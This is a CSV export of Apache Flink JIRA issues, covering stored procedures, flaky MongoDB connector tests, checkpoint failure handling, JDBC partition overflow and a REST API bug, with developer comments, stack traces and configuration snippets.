c11fd82e0cc63904b43d2aca3a79d85dfeb57c2f;;;",,,,,,,,,,,,,,,,,,,,,,
FLIP-311: Support Call Stored Procedure,FLINK-32350,13540202,,New Feature,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,luoyuxia,luoyuxia,luoyuxia,15/Jun/23 11:36,18/Aug/23 02:24,04/Jun/24 20:41,18/Aug/23 02:24,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,,,,0,,,,Umbrella issue for https://cwiki.apache.org/confluence/display/FLINK/FLIP-311%3A+Support+Call+Stored+Procedure,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-15 11:36:04.0,,,,,,,,,,"0|z1ikso:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support atomic for CREATE TABLE AS SELECT(CTAS) statement,FLINK-32349,13540195,13543203,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,tartarus,tartarus,15/Jun/23 10:59,12/Jul/23 02:46,04/Jun/24 20:41,12/Jul/23 01:45,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,,,,0,pull-request-available,,,"For detailed information, see FLIP-305

https://cwiki.apache.org/confluence/display/FLINK/FLIP-305%3A+Support+atomic+for+CREATE+TABLE+AS+SELECT%28CTAS%29+statement",,,,,,,,,,,,,,,,FLINK-28460,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 12 01:45:31 UTC 2023,,,,,,,,,,"0|z1ikr4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jul/23 01:45;luoyuxia;master:

e6f77bea70682d1f2d708abee75a0dc33de16ee7;;;",,,,,,,,,,,,,,,,,,,,,,
MongoDB tests are flaky and time out,FLINK-32348,13540181,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,jiabao.sun,martijnvisser,martijnvisser,15/Jun/23 09:47,12/Jul/23 09:13,04/Jun/24 20:41,12/Jul/23 09:13,,,,,,,,,,,,,,,mongodb-1.0.2,,,,,,Connectors / MongoDB,,,,0,pull-request-available,test-stability,,https://github.com/apache/flink-connector-mongodb/actions/runs/5232649632/jobs/9447519651#step:13:39307,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 12 09:13:20 UTC 2023,,,,,,,,,,"0|z1iko0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 09:49;martijnvisser;A full run with thread dumps can be found at https://github.com/apache/flink-connector-mongodb/actions/runs/5276796512/jobs/9543998611?pr=10#step:15:48;;;","15/Jun/23 09:52;martijnvisser;[~jiabao.sun] Could you take a look?;;;","15/Jun/23 10:10;jiabao.sun;Sure.;;;","30/Jun/23 02:29;jiabao.sun;Hi [~martijnvisser]

I tried to investigate and reproduce the issue, and found that when the `AsyncCheckpointRunnable` meets `CancellationException`, the task never stops as expected.

I think this problem may relate to [FLINK-25902|https://issues.apache.org/jira/browse/FLINK-25902].
The root cause of this problem remains to be further investigated.


{code:sh}
00:30:26,533 [flink-akka.actor.default-dispatcher-10] INFO  org.apache.flink.runtime.checkpoint.CheckpointCoordinator    [] - Triggering Checkpoint 4 for job 79765d8c304b804a1adbd3677bc39708 failed due to org.apache.flink.runtime.checkpoint.CheckpointException: TaskManager received a checkpoint request for unknown task 6585a08f46e2d380ebe0ac7fde3739a7_cbc357ccb763df2852fee8c4fc7d55f2_1_1. Failure reason: Task local checkpoint failure.
00:30:26,533 [    Checkpoint Timer] WARN  org.apache.flink.runtime.checkpoint.CheckpointFailureManager [] - Failed to trigger or complete checkpoint 4 for job 79765d8c304b804a1adbd3677bc39708. (0 consecutive failed attempts so far)
org.apache.flink.runtime.checkpoint.CheckpointException: TaskManager received a checkpoint request for unknown task 6585a08f46e2d380ebe0ac7fde3739a7_cbc357ccb763df2852fee8c4fc7d55f2_1_1. Failure reason: Task local checkpoint failure.
	at org.apache.flink.runtime.taskexecutor.TaskExecutor.triggerCheckpoint(TaskExecutor.java:1025) ~[flink-runtime-1.17-SNAPSHOT.jar:1.17-SNAPSHOT]
	at sun.reflect.GeneratedMethodAccessor34.invoke(Unknown Source) ~[?:?]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_372]
	at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_372]
	at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.lambda$handleRpcInvocation$1(AkkaRpcActor.java:309) ~[?:?]
	at org.apache.flink.runtime.concurrent.akka.ClassLoadingUtils.runWithContextClassLoader(ClassLoadingUtils.java:83) ~[?:?]
	at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleRpcInvocation(AkkaRpcActor.java:307) ~[?:?]
	at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleRpcMessage(AkkaRpcActor.java:222) ~[?:?]
	at org.apache.flink.runtime.rpc.akka.AkkaRpcActor.handleMessage(AkkaRpcActor.java:168) ~[?:?]
	at akka.japi.pf.UnitCaseStatement.apply(CaseStatements.scala:24) ~[?:?]
	at akka.japi.pf.UnitCaseStatement.apply(CaseStatements.scala:20) ~[?:?]
	at scala.PartialFunction.applyOrElse(PartialFunction.scala:127) ~[?:?]
	at scala.PartialFunction.applyOrElse$(PartialFunction.scala:126) ~[?:?]
	at akka.japi.pf.UnitCaseStatement.applyOrElse(CaseStatements.scala:20) ~[?:?]
	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:175) ~[?:?]
	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:176) ~[?:?]
	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:176) ~[?:?]
	at akka.actor.Actor.aroundReceive(Actor.scala:537) ~[?:?]
	at akka.actor.Actor.aroundReceive$(Actor.scala:535) ~[?:?]
	at akka.actor.AbstractActor.aroundReceive(AbstractActor.scala:220) ~[?:?]
	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:579) ~[?:?]
	at akka.actor.ActorCell.invoke(ActorCell.scala:547) ~[?:?]
	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:270) ~[?:?]
	at akka.dispatch.Mailbox.run(Mailbox.scala:231) ~[?:?]
	at akka.dispatch.Mailbox.exec(Mailbox.scala:243) ~[?:?]
	at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289) ~[?:1.8.0_372]
	at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056) ~[?:1.8.0_372]
	at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692) ~[?:1.8.0_372]
	at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:175) ~[?:1.8.0_372]
00:30:26,554 [AsyncOperations-thread-1] INFO  org.apache.flink.streaming.runtime.tasks.AsyncCheckpointRunnable [] - Sink: Data stream collect sink (1/1)#1 - asynchronous part of checkpoint 4 could not be completed.
java.util.concurrent.CancellationException: null
	at java.util.concurrent.FutureTask.report(FutureTask.java:121) ~[?:1.8.0_372]
	at java.util.concurrent.FutureTask.get(FutureTask.java:192) ~[?:1.8.0_372]
	at org.apache.flink.util.concurrent.FutureUtils.runIfNotDoneAndGet(FutureUtils.java:544) ~[flink-core-1.17-SNAPSHOT.jar:1.17-SNAPSHOT]
	at org.apache.flink.streaming.api.operators.OperatorSnapshotFinalizer.<init>(OperatorSnapshotFinalizer.java:60) ~[flink-streaming-java-1.17-SNAPSHOT.jar:1.17-SNAPSHOT]
	at org.apache.flink.streaming.runtime.tasks.AsyncCheckpointRunnable.finalizeNonFinishedSnapshots(AsyncCheckpointRunnable.java:191) ~[flink-streaming-java-1.17-SNAPSHOT.jar:1.17-SNAPSHOT]
	at org.apache.flink.streaming.runtime.tasks.AsyncCheckpointRunnable.run(AsyncCheckpointRunnable.java:124) ~[flink-streaming-java-1.17-SNAPSHOT.jar:1.17-SNAPSHOT]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) ~[?:1.8.0_372]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) ~[?:1.8.0_372]
	at java.lang.Thread.run(Thread.java:750) ~[?:1.8.0_372]
00:30:26,559 [jobmanager-io-thread-2] WARN  org.apache.flink.runtime.checkpoint.CheckpointCoordinator    [] - Received late message for now expired checkpoint attempt 4 from task 6585a08f46e2d380ebe0ac7fde3739a7_cbc357ccb763df2852fee8c4fc7d55f2_0_1 of job 79765d8c304b804a1adbd3677bc39708 at c5c049a8-08be-4625-9431-5e9d1f75ba01 @ localhost (dataPort=41367).
00:30:26,609 [    Checkpoint Timer] INFO  org.apache.flink.runtime.checkpoint.CheckpointCoordinator    [] - Triggering checkpoint 5 (type=CheckpointType{name='Checkpoint', sharingFilesStrategy=FORWARD_BACKWARD}) @ 1686443426609 for job 79765d8c304b804a1adbd3677bc39708.
00:30:26,899 [jobmanager-io-thread-2] INFO  org.apache.flink.runtime.checkpoint.CheckpointCoordinator    [] - Completed checkpoint 5 for job 79765d8c304b804a1adbd3677bc39708 (2327692 bytes, checkpointDuration=290 ms, finalizationTime=0 ms).
00:30:26,906 [SourceCoordinator-Source: MongoDB-Source] INFO  org.apache.flink.runtime.source.coordinator.SourceCoordinator [] - Marking checkpoint 5 as completed for source Source: MongoDB-Source.
00:30:26,906 [    Checkpoint Timer] INFO  org.apache.flink.runtime.checkpoint.CheckpointCoordinator    [] - Triggering checkpoint 6 (type=CheckpointType{name='Checkpoint', sharingFilesStrategy=FORWARD_BACKWARD}) @ 1686443426906 for job 79765d8c304b804a1adbd3677bc39708.
00:30:27,170 [jobmanager-io-thread-1] INFO  org.apache.flink.runtime.checkpoint.CheckpointCoordinator    [] - Completed checkpoint 6 for job 79765d8c304b804a1adbd3677bc39708 (2327692 bytes, checkpointDuration=263 ms, finalizationTime=1 ms).
00:30:27,170 [    Checkpoint Timer] INFO  org.apache.flink.runtime.checkpoint.CheckpointRequestDecider [] - checkpoint request time in queue: 161
00:30:27,171 [SourceCoordinator-Source: MongoDB-Source] INFO  org.apache.flink.runtime.source.coordinator.SourceCoordinator [] - Marking checkpoint 6 as completed for source Source: MongoDB-Source.
00:30:27,171 [    Checkpoint Timer] INFO  org.apache.flink.runtime.checkpoint.CheckpointCoordinator    [] - Triggering checkpoint 7 (type=CheckpointType{name='Checkpoint', sharingFilesStrategy=FORWARD_BACKWARD}) @ 1686443427170 for job 79765d8c304b804a1adbd3677bc39708.
00:30:27,424 [jobmanager-io-thread-1] INFO  org.apache.flink.runtime.checkpoint.CheckpointCoordinator    [] - Completed checkpoint 7 for job 79765d8c304b804a1adbd3677bc39708 (2327692 bytes, checkpointDuration=254 ms, finalizationTime=0 ms).
00:30:27,427 [SourceCoordinator-Source: MongoDB-Source] INFO  org.apache.flink.runtime.source.coordinator.SourceCoordinator [] - Marking checkpoint 7 as completed for source Source: MongoDB-Source.
{code}

;;;","30/Jun/23 12:26;martijnvisser;[~jiabao.sun] That problem was fixed with Flink 1.15, while this issue occurs with later Flink versions. ;;;","03/Jul/23 07:26;martijnvisser;This week's run also failed: https://github.com/apache/flink-connector-mongodb/actions/runs/5433810366/jobs/9881741648#step:13:39415;;;","03/Jul/23 07:28;martijnvisser;[~jiabao.sun] It looks like MongoSourceITCase#testRecovery hangs:

{code:java}
""main"" #1 prio=5 os_prio=0 tid=0x00007fedb800a800 nid=0xc75 sleeping[0x00007fedbefd2000]
   java.lang.Thread.State: TIMED_WAITING (sleeping)
	at java.lang.Thread.sleep(Native Method)
	at org.apache.flink.streaming.api.operators.collect.CollectResultFetcher.sleepBeforeRetry(CollectResultFetcher.java:245)
	at org.apache.flink.streaming.api.operators.collect.CollectResultFetcher.next(CollectResultFetcher.java:114)
	at org.apache.flink.streaming.api.operators.collect.CollectResultIterator.nextResultFromFetcher(CollectResultIterator.java:106)
	at org.apache.flink.streaming.api.operators.collect.CollectResultIterator.hasNext(CollectResultIterator.java:80)
	at java.util.Iterator.forEachRemaining(Iterator.java:115)
	at org.apache.flink.util.CollectionUtil.iteratorToList(CollectionUtil.java:122)
	at org.apache.flink.connector.mongodb.source.MongoSourceITCase.testRecovery(MongoSourceITCase.java:264)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
{code};;;","11/Jul/23 17:07;jiabao.sun;[~martijnvisser] Sorry for the late reply.

The root cause of this error is not removing it from readersAwaitingSplit when closing an idle reader.
This resulted in splits being incorrectly assigned to readers that did not complete when resuming tasks from checkpoints.

1. readersAwaitingSplit: [0]
2. signalNoMoreSplits but not remove 0 from readersAwaitingSplit
3. TaskManager failover
4. split request from reader 1 -> readersAwaitingSplit: [0, 1]
5. but actually assigns split to reader 0.

The PR is ready, could you help review it?;;;","12/Jul/23 09:13;leonard;Fixed by flink-connector-mongodb(main): e2babc9bcfa501a3f6727f28c677c199f7bfcad5;;;",,,,,,,,,,,,,,
Exceptions from the CompletedCheckpointStore are not registered by the CheckpointFailureManager ,FLINK-32347,13540172,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,srichter,vivacell,vivacell,15/Jun/23 09:05,27/Jun/23 13:12,04/Jun/24 20:41,27/Jun/23 13:10,1.15.3,1.16.2,1.17.1,,,,,,,,,,,,1.18.0,,,,,,Runtime / Checkpointing,,,,0,pull-request-available,,,"Currently if an error occurs while saving a completed checkpoint in the {_}CompletedCheckpointStore{_}, _CheckpointCoordinator_ doesn't call _CheckpointFailureManager_ to handle the error. Such behavior leads to the fact, that errors from _CompletedCheckpointStore_ don't increase the failed checkpoints count and _'execution.checkpointing.tolerable-failed-checkpoints'_ option does not limit the number of errors of this kind in any way.

Possible solution may be to move the notification of _CheckpointFailureManager_ about successful checkpoint after storing completed checkpoint in the _CompletedCheckpointStore_ and providing the exception to the _CheckpointFailureManager_ in the {_}CheckpointCoordinator#{_}{_}[addCompletedCheckpointToStoreAndSubsumeOldest()|https://github.com/apache/flink/blob/master/flink-runtime/src/main/java/org/apache/flink/runtime/checkpoint/CheckpointCoordinator.java#L1440]{_} method.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 13:23:06 UTC 2023,,,,,,,,,,"0|z1ikm0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 12:16;vivacell;Hi, [~srichter] ! I've already fixed this issue in our local flink fork, so I can share it if you haven't started working on the task yet.;;;","15/Jun/23 13:23;srichter;Hey, I've already opened a PR. The issue was still unassigned, so I thought I can still work on it.;;;",,,,,,,,,,,,,,,,,,,,,
"JdbcNumericBetweenParametersProvider  Sharding key boundaries large storage long integer overflow, use BigDecimal instead Long",FLINK-32346,13540168,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,sunnny,sunnny,15/Jun/23 08:45,19/Dec/23 04:38,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Connectors / JDBC,,,,0,,,,"*JdbcNumericBetweenParametersProvider.class*

Sharding key boundaries large storage long integer overflow, use BigDecimal instead Long, so that length types such as DecimalType(30,0) are compatible and LONG cannot be stored Can be assigned to me and I want to complete it  

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/23 08:42;sunnny;image-2023-06-15-16-42-16-773.png;https://issues.apache.org/jira/secure/attachment/13059088/image-2023-06-15-16-42-16-773.png","15/Jun/23 08:46;sunnny;image-2023-06-15-16-46-13-188.png;https://issues.apache.org/jira/secure/attachment/13059089/image-2023-06-15-16-46-13-188.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Dec 19 04:38:34 UTC 2023,,,,,,,,,,"0|z1ikl4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 08:47;sunnny;* If approved, please assign it to me. Thank you
  !image-2023-06-15-16-42-16-773.png!;;;","15/Jun/23 09:04;libenchao;Wow, {{long}} is very large already, in what cases will you encounter overflow? Is it specific to your data model?;;;","16/Jun/23 03:30;sunnny; such as:Mysql ddl : *id bigint(30) unsigned NOT NULL AUTO_INCREMENT*;;;","18/Dec/23 06:10;sunnny;Hi  Community gods Can I support this feature? If this feature is supported, it will support all integer types, and there will be no limit to the length,[~libenchao] [~martijnvisser]  ;;;","18/Dec/23 11:22;libenchao;[~sunnny] I agree the partition columns can/should consider more data types. 

Currently the documentation and the code already diverge. The document says ""The scan.partition.column must be a numeric, date, or timestamp column from the table in question"", however the code only supports numeric (not bigger than long). ;;;","19/Dec/23 04:38;sunnny;Due to some strange database design, the primary key of many tables is a UUID string, I think we can support this as a priority, I am preparing how to implement
[~libenchao] ;;;",,,,,,,,,,,,,,,,,
Improve parallel download of RocksDB incremental state,FLINK-32345,13540162,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,srichter,srichter,srichter,15/Jun/23 08:25,28/Jul/23 13:09,04/Jun/24 20:41,27/Jun/23 13:19,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / State Backends,,,,0,pull-request-available,,,"{{RocksDBStateDownloader}} is used to download the files for incremental checkpoints in parallel. However, the parallelism is currently restricted to a single {{IncrementalRemoteKeyedStateHandle}} and also a single state type (shared, private) within the handle at a time.
We should support parallelization across multiple state types and across multiple state handles. In particular, this can improve our download times for scale-in.",,,,,,,,,,,,,,,,,,,,,,,FLINK-32681,,,,,FLINK-10461,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-15 08:25:44.0,,,,,,,,,,"0|z1ikjs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MongoDB connector support unbounded streaming read via ChangeStream feature,FLINK-32344,13540159,,New Feature,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,jiabao.sun,jiabao.sun,jiabao.sun,15/Jun/23 07:57,10/Sep/23 22:35,04/Jun/24 20:41,,mongodb-1.0.1,,,,,,,,,,,,,,,,,,,,Connectors / MongoDB,,,,0,pull-request-available,stale-assigned,,"Change streams allow applications to access real-time data changes without the complexity and risk of tailing the oplog. Applications can use change streams to subscribe to all data changes on a single collection, a database, or an entire deployment, and immediately react to them. Because change streams use the aggregation framework, applications can also filter for specific changes or transform the notifications at will.

We can use MongoDB change streams feature to support unbounded streaming read for mongodb connector.

[Change Streams|https://www.mongodb.com/docs/manual/changeStreams/#change-streams]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Sep 10 22:35:03 UTC 2023,,,,,,,,,,"0|z1ikj4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","11/Aug/23 02:17;jiabao.sun;This PR has been open for a long time.
Is there anyone have time to help with a review?
Thanks a lot. :);;;","10/Sep/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,,,
Fix exception for jdbc tools,FLINK-32343,13540153,13528918,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zjureel,zjureel,zjureel,15/Jun/23 07:38,15/Jun/23 11:30,04/Jun/24 20:41,15/Jun/23 11:30,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / JDBC,,,,0,pull-request-available,,,Fix exception for jdbc tools,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 11:30:39 UTC 2023,,,,,,,,,,"0|z1ikhs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 11:30;libenchao;Fixed via [https://github.com/apache/flink/commit/a521f5a98a7ae759631acce953d4717f14381fc4] (master)

[~zjureel] Thanks for the PR!;;;",,,,,,,,,,,,,,,,,,,,,,
SQL Server container behaves unexpected while testing with several surefire forks,FLINK-32342,13540152,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Sergey Nuyanzin,Sergey Nuyanzin,15/Jun/23 07:38,15/Jun/23 11:38,04/Jun/24 20:41,,jdbc-3.1.0,jdbc-3.1.1,,,,,,,,,,,,,,,,,,,Connectors / JDBC,,,,0,,,,"By default it inherits {{flink.forkCountITCase == 2}} from Flink.
it looks sqlserver container has issues with starting in several surefire forks...
Based on [https://github.com/MartijnVisser/flink-connector-jdbc/actions/runs/5265349453/jobs/9517854060]
sql server container is hanging while start
{noformat}
""main"" #1 prio=5 os_prio=0 cpu=1965.96ms elapsed=2568.93s tid=0x00007f84a0027000 nid=0x1c82 runnable  [0x00007f84a41fc000]
   java.lang.Thread.State: RUNNABLE
	at java.net.SocketInputStream.socketRead0(java.base@11.0.19/Native Method)
	at java.net.SocketInputStream.socketRead(java.base@11.0.19/SocketInputStream.java:115)
	at java.net.SocketInputStream.read(java.base@11.0.19/SocketInputStream.java:168)
	at java.net.SocketInputStream.read(java.base@11.0.19/SocketInputStream.java:140)
	at com.microsoft.sqlserver.jdbc.TDSChannel$ProxyInputStream.readInternal(IOBuffer.java:1192)
	- locked <0x00000000930e38f0> (a com.microsoft.sqlserver.jdbc.TDSChannel$ProxyInputStream)
	at com.microsoft.sqlserver.jdbc.TDSChannel$ProxyInputStream.read(IOBuffer.java:1179)
	at com.microsoft.sqlserver.jdbc.TDSChannel.read(IOBuffer.java:2307)
	- locked <0x00000000930e38f0> (a com.microsoft.sqlserver.jdbc.TDSChannel$ProxyInputStream)
	at com.microsoft.sqlserver.jdbc.SQLServerConnection.Prelogin(SQLServerConnection.java:3391)
	at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectHelper(SQLServerConnection.java:3200)
	at com.microsoft.sqlserver.jdbc.SQLServerConnection.login(SQLServerConnection.java:2833)
	at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectInternal(SQLServerConnection.java:2671)
	at com.microsoft.sqlserver.jdbc.SQLServerConnection.connect(SQLServerConnection.java:1640)
	at com.microsoft.sqlserver.jdbc.SQLServerDriver.connect(SQLServerDriver.java:936)
	at org.testcontainers.containers.JdbcDatabaseContainer.createConnection(JdbcDatabaseContainer.java:253)
	at org.testcontainers.containers.JdbcDatabaseContainer.createConnection(JdbcDatabaseContainer.java:218)
	at org.testcontainers.containers.JdbcDatabaseContainer.waitUntilContainerStarted(JdbcDatabaseContainer.java:158)
	at org.testcontainers.containers.GenericContainer.tryStart(GenericContainer.java:490)
	at org.testcontainers.containers.GenericContainer.lambda$doStart$0(GenericContainer.java:344)
	at org.testcontainers.containers.GenericContainer$$Lambda$532/0x00000001003d1440.call(Unknown Source)
	at org.rnorth.ducttape.unreliables.Unreliables.retryUntilSuccess(Unreliables.java:81)
	at org.testcontainers.containers.GenericContainer.doStart(GenericContainer.java:334)
	at org.testcontainers.containers.GenericContainer.start(GenericContainer.java:322)
	at org.apache.flink.connector.jdbc.testutils.databases.sqlserver.SqlServerDatabase$SqlServerContainer.start(SqlServerDatabase.java:81)
	at org.apache.flink.connector.jdbc.testutils.databases.sqlserver.SqlServerDatabase.startDatabase(SqlServerDatabase.java:52)
	at org.apache.flink.connector.jdbc.testutils.DatabaseExtension.beforeAll(DatabaseExtension.java:122)
...
{noformat}


as a WA setting {{flink.forkCountITCase == 1}} solves the issue
However need to find a better way to allow running tests with several forks",,,,,,,,,,,,,,,,,,,,,,,FLINK-32325,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 08:26:09 UTC 2023,,,,,,,,,,"0|z1ikhk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 08:26;martijnvisser;Mitigated via:

apache/flink-connector-jdbc@main: e6f70722d09036893c18f76b124e7e045b359e68
apache/flink-connector-jdbc@v3.1: bba2d9e2cf03e227c3e4461324389e8c4a307fb9;;;",,,,,,,,,,,,,,,,,,,,,,
 Fix resource requirements rest API response empty result,FLINK-32341,13540069,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Cannot Reproduce,,chachae,chachae,14/Jun/23 15:55,03/Jul/23 11:00,04/Jun/24 20:41,03/Jul/23 11:00,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / REST,,,,0,pull-request-available,,,"I build the latest master branch with flink-1.18-SNAPSHOT, setting adaptive schedule-mode configuration, start a streaming job by standalone deployment and try to change per-vertex desired parallelism through WEB UI, then I found that the get method request for /jobs/:jobid/resource-requirements API did not response anything and then causing the put method request for /jobs/:jobid/resource-requirements is fail to desired parallelism",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jun/23 14:57;chachae;image-2023-06-14-22-57-57-830.png;https://issues.apache.org/jira/secure/attachment/13059064/image-2023-06-14-22-57-57-830.png","14/Jun/23 14:58;chachae;image-2023-06-14-22-58-02-270.png;https://issues.apache.org/jira/secure/attachment/13059063/image-2023-06-14-22-58-02-270.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,Java,Thu Jun 15 07:36:19 UTC 2023,,,,,,,,,,"0|z1ijz4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jun/23 16:19;chesnay;What kind of job are you submitting? I'm reasonable sure that the feature works because we're using it internally, and as I recall there haven't been and related changes.
I tried the rest api locally with some reasonable recent master build and it works just fine.;;;","14/Jun/23 16:35;chachae;I submitting the official example demo job by standalone deployment, the start shell commands for JM and TM are as follows
{code:java}
cd flink-1.18-SNAPSHOT/
{code}
{code:java}
cp examples/streaming/StateMachineExample.jar lib
{code}
{code:java}
./bin/standalone-job.sh start -j org.apache.flink.streaming.examples.statemachine.StateMachineExample
{code}
{code:java}
./bin/taskmanager.sh start
{code}
flink-conf.xml (key config)
{code:java}
jobmanager.scheduler: Adaptive
state.checkpoints.dir: file:///mylocaldir/checkpoint/
execution.checkpointing.interval: 10s
execution.checkpointing.max-concurrent-checkpoints: 1
execution.checkpointing.min-pause: 0
execution.checkpointing.mode: EXACTLY_ONCE
execution.checkpointing.timeout: 5min
execution.checkpointing.tolerable-failed-checkpoints: 0
execution.checkpointing.unaligned: false
{code};;;","15/Jun/23 07:36;chesnay;Have you made any modifications to Flink? What Java version are you using? Can you enable debug logging and upload the jobmanager logs?;;;",,,,,,,,,,,,,,,,,,,,
NPE in K8s operator which brakes current and subsequent deployments,FLINK-32340,13540061,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
